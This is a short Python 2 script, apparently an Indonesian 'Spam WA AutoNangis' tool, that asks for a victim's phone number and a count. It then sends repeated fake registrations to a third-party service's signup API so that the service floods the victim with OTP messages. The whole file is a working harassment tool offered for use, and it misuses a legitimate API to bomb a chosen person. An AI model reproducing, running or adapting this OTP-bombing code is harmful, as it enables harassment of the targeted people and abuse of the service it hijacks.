import requests as r
import json,os
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
try:
 os.system("clear")
 print """%s
 %sAuthor   : Ryzz%s
 %sGithub   : github.com/Ryzz03%s
 %sWhatsapp : +6282192959xxx%s
 %sSpam WA AutoNangis v2"""%(qu,pu,qu,pu,qu,pu,qu,qu)
 print
 no = raw_input("%s[%s!%s] %sNomornya mana? (ex:0821xxx) : "%(pu,me,pu,pu))
 jum = int(raw_input("%s[%s!%s] %sSpam? (1 - 100) : "%(pu,me,pu,pu)))
 dat = {"nama":"Ryzz","phone":no,"password":"Ryzz03"}
 u = 1
 for x in range(jum):
    hyu = r.post("https://api.socialfarm.id/api/mitra/register",headers={'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Safari/537.36'},data=dat).text
    gob = json.loads(hyu)
    if gob["message"] == 'Registrasi berhasil, silahkan konfirmasi kode OTP':
     print "%s[%s%s%s] %sSukses mengirim spam ke %s%s"%(pu,qu,u,pu,pu,ku,no)
     u += 1
    else:
     print "%s[%s%s%s] %sGagal mengirim spam ke %s%s"%(pu,qu,u,pu,pu,ku,no)
     u += 1
except KeyboardInterrupt:
 print "\r%s[%s!%s] %sUdah cok! 'v' "%(pu,qu,pu,pu)
except r.exceptions.ConnectionError:
 print "%s[%s!%s] %sKoneksi, error !!!"%(pu,qu,pu,pu)

